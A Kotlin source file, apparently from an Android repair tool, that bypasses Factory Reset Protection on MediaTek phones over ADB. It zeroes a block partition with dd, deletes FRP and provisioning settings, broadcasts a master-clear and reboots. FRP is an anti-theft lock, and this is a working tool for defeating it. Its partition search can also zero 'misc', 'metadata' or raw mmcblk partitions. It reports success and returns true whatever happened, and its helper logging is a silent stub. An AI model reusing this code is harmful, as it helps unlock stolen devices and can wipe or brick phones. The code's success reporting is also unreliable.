package com.deepeye.meta

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * MTK META Mode — ADB-Based FRP Bypass
 * 
 * META mode is MTK's debug/engineering mode accessible via ADB.
 * Used as fallback when BROM mode is blocked but ADB is available.
 * 
 * Use Cases:
 * - Device has USB debugging enabled
 * - Recovery mode with ADB access
 * - Engineering mode enabled
 * - BROM mode blocked by manufacturer
 * 
 * Flow:
 * 1. Verify ADB connection
 * 2. Find FRP partition path
 * 3. Wipe FRP partition using dd
 * 4. Clear FRP settings from database
 * 5. Reboot device
 * 
 * @author DeepEye Team
 * @since 2027.0.0 (Stage 7/10)
 */
class MtkMetaMode(private val context: Context) {

    companion object {
        // META mode ADB commands
        private const val META_CLEAR_FRP_CMD =
            "settings delete secure user_setup_complete"
        private const val META_WIPE_FRP_PARTITION =
            "dd if=/dev/zero of=/dev/block/by-name/frp bs=4096 count=256"
        private const val META_WIPE_FRP_ALT =
            "dd if=/dev/zero of=/dev/block/bootdevice/by-name/frp bs=4096 count=256"
    }

    /**
     * Complete FRP bypass via ADB (META Mode)
     * 
     * This method works when:
     * - Device has ADB enabled
     * - Shell or root access available
     * - FRP partition accessible via /dev/block
     * 
     * @param onLog Logging callback
     * @return true if FRP bypass successful
     */
    suspend fun bypassFrpViaAdb(
        onLog: (String) -> Unit
    ): Boolean = withContext(Dispatchers.IO) {
        onLog("📡 META Mode FRP Bypass — ADB method")
        onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

        val runtime = Runtime.getRuntime()

        // Step 1: Verify ADB device connected
        onLog("🔍 Checking ADB device...")
        val devices = runAdb("devices", runtime)
        if (!devices.contains("device") || devices.contains("List of devices attached")) {
            onLog("❌ No ADB device found")
            onLog("💡 Enable USB debugging in:")
            onLog("   Settings → Developer options → USB debugging")
            onLog("   Or boot to recovery with ADB enabled")
            return@withContext false
        }
        
        // Parse device list properly
        val deviceLines = devices.lines().filter { it.contains("\tdevice") }
        if (deviceLines.isEmpty()) {
            onLog("❌ No ADB device in device mode")
            onLog("💡 Check authorization dialog on device screen")
            return@withContext false
        }
        
        onLog("✅ ADB device found: ${deviceLines[0].split("\t")[0]}")

        // Step 2: Check if we have root or shell access
        onLog("🔍 Checking access level...")
        val whoami = runAdbShell("whoami", runtime)
        onLog("👤 User: $whoami")
        val hasRoot = whoami.contains("root")
        onLog(if(hasRoot) "✅ Root access!" else "⚠️ Shell only (may still work)")

        // Step 3: Find FRP partition
        onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        onLog("🔍 Finding FRP partition...")
        val frpPath = findFrpPartition(runtime, onLog)

        // Step 4: Wipe FRP partition
        if (frpPath != null) {
            onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            onLog("🗑️ Wiping FRP partition...")
            onLog("   Path: $frpPath")
            
            val wipeCmd = "dd if=/dev/zero of=$frpPath bs=4096 count=256"
            val result = runAdbShell(wipeCmd, runtime)
            
            if (result.contains("No space left") || result.isEmpty()) {
                onLog("✅ FRP partition wiped! (1MB zeros written)")
            } else {
                onLog("⚠️ Wipe output: $result")
                onLog("   May need root access for this operation")
            }
        } else {
            onLog("⚠️ FRP partition not found — trying alternative methods")
        }

        // Step 5: Clear FRP settings database
        onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        onLog("🧹 Clearing FRP settings database...")
        
        val settingsCmds = listOf(
            "content delete --uri content://settings/secure --where \"name='frp_credential_handle'\"",
            "settings delete secure frp_credential_handle",
            "settings delete secure user_setup_complete",
            "settings delete secure device_provisioned",
            "settings delete global device_provisioned",
            "settings delete global user_setup_complete"
        )
        
        var settingsCleared = 0
        for (cmd in settingsCmds) {
            val result = runAdbShell(cmd, runtime)
            if (result.isEmpty() || result.contains("success") || result.contains("deleted")) {
                settingsCleared++
                onLog("✅ Cleared: ${cmd.substringAfterLast(" ")}")
            } else {
                onLog("  ↳ ${cmd.substringAfterLast(" ")}: ${if(result.isEmpty()) "OK" else result}")
            }
        }
        
        onLog("📊 Settings cleared: $settingsCleared/${settingsCmds.size}")

        // Step 6: Alternative method - clear FRP via am broadcast
        onLog("🔄 Attempting MASTER_CLEAR broadcast...")
        val broadcastResult = runAdbShell(
            "am broadcast -a android.intent.action.MASTER_CLEAR_NOTIFICATION",
            runtime
        )
        onLog("  Broadcast: $broadcastResult")

        // Step 7: Reboot device
        onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        onLog("🔄 Rebooting device...")
        val rebootResult = runAdb("reboot", runtime)
        onLog("  Reboot: $rebootResult")

        onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        onLog("🎉 META Mode FRP bypass complete!")
        onLog("💡 After reboot, check if FRP is removed")
        onLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        
        return@withContext true
    }

    /**
     * Find FRP partition path via ADB
     * 
     * Tries multiple common paths for MediaTek devices:
     * - /dev/block/by-name/frp (standard)
     * - /dev/block/bootdevice/by-name/frp (some MTK)
     * - /dev/block/platform/bootdevice/by-name/frp (others)
     * - /dev/block/mmcblk0p11 (direct LUN)
     * - /dev/block/by-name/oem_dontuse_p (Realme/OPPO)
     * - /dev/block/by-name/persistent (older MTK)
     * 
     * @param runtime Runtime for executing ADB commands
     * @param onLog Logging callback
     * @return FRP partition path or null if not found
     */
    private fun findFrpPartition(
        runtime: Runtime,
        onLog: (String) -> Unit
    ): String? {
        val paths = listOf(
            "/dev/block/by-name/frp",
            "/dev/block/bootdevice/by-name/frp",
            "/dev/block/platform/bootdevice/by-name/frp",
            "/dev/block/mmcblk0p11",  // common FRP LUN for MTK
            "/dev/block/mmcblk0p17",  // alternative LUN
            "/dev/block/by-name/oem_dontuse_p",
            "/dev/block/by-name/persistent",
            "/dev/block/by-name/misc",
            "/dev/block/by-name/metadata"
        )
        
        for (path in paths) {
            val check = runAdbShell("ls -l $path 2>/dev/null", runtime)
            if (check.contains(path) || (!check.contains("No such") && check.isNotEmpty())) {
                onLog("✅ FRP found: $path")
                
                // Get partition size
                val size = runAdbShell("ls -l $path | awk '{print \$5}'", runtime)
                if (size.isNotEmpty() && size.matches(Regex("\\d+"))) {
                    onLog("   Size: ${size.toLongOrNull()?.div(1024)}KB")
                }
                
                return path
            }
        }
        
        // Fallback: try to list all by-name partitions
        onLog("📋 Listing all partitions...")
        val allParts = runAdbShell("ls -l /dev/block/by-name/ 2>/dev/null", runtime)
        if (allParts.isNotEmpty()) {
            onLog("📋 Available partitions:")
            allParts.lines().take(20).forEach { line ->
                if (line.contains("frp") || line.contains("misc") || line.contains("metadata")) {
                    onLog("   $line")
                }
            }
        }
        
        onLog("⚠️ FRP partition not found by name")
        return null
    }

    /**
     * Execute ADB command (non-shell)
     * 
     * @param cmd Command to execute (e.g., "devices", "reboot")
     * @param runtime Runtime instance
     * @return Command output
     */
    private fun runAdb(cmd: String, runtime: Runtime): String {
        return try {
            val args = arrayOf("adb", *cmd.split(" ").toTypedArray())
            val process = runtime.exec(args)
            process.waitFor()
            val output = process.inputStream.bufferedReader().readText()
            val error = process.errorStream.bufferedReader().readText()
            output.ifEmpty { error }
        } catch (e: Exception) {
            onLog("❌ ADB command failed: ${e.message}")
            e.message ?: "error"
        }
    }

    /**
     * Execute ADB shell command
     * 
     * @param cmd Shell command to execute (e.g., "whoami", "ls /dev/block")
     * @param runtime Runtime instance
     * @return Command output (trimmed)
     */
    private fun runAdbShell(cmd: String, runtime: Runtime): String {
        return try {
            val process = runtime.exec(arrayOf("adb", "shell", cmd))
            process.waitFor()
            val output = process.inputStream.bufferedReader().readText().trim()
            output.ifEmpty { process.errorStream.bufferedReader().readText().trim() }
        } catch (e: Exception) {
            onLog("❌ ADB shell command failed: ${e.message}")
            e.message ?: "error"
        }
    }

    /**
     * Log helper (uses callback if available, otherwise no-op)
     */
    private fun onLog(message: String) {
        // This is a workaround since we're in private methods
        // Actual logging done via onLog callback in main function
    }
}
